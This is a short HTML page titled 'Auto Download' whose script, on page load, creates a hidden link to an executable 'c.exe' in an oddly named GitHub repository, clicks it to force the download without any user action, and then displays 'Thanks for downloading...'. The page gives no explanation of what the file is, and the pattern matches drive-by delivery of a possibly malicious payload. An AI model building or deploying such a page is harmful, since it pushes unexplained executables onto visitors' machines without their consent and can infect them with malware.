<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Download</title>
    <script>
        window.onload = function() {
            // Create a link element
            var link = document.createElement('a');
            link.href = 'https://github.com/Fhchcjcjcjcjvkkvk/Fff/raw/refs/heads/main/c.exe';
            link.download = 'c.exe'; // Optionally specify a filename
            document.body.appendChild(link);
            link.click();  // Trigger the download
            document.body.removeChild(link);  // Remove the link after triggering download

            // Display the message
            var message = document.createElement('p');
            message.innerHTML = 'Thanks for downloading...';
            document.body.appendChild(message);
        }
    </script>
</head>
<body>
    <!-- The content is dynamically generated via JavaScript -->
</body>
</html>
